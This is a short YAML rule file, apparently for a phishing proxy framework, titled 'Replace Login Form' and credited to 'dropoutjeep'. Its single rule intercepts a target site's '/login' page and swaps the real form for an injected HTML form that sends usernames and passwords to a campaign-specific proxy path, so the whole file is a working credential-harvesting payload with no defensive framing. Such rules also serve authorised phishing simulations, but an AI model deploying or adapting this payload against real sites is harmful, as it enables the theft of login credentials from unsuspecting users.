metadata:
  title: Replace Login Form
  description: Substitutes the target's login form with one that POSTs credentials back to the phishing proxy.
  author: dropoutjeep

rules:
  - url: "/login"
    match: word
    methods: ["GET", "POST"]
    replace:
      response:
        body:
          replace_selector:
            "form": "<form action='/proxy/{{ .CampaignID }}/login' method='POST'><input type='text' name='username' placeholder='Username'><input type='password' name='password' placeholder='Password'><button type='submit'>Sign In</button></form>"
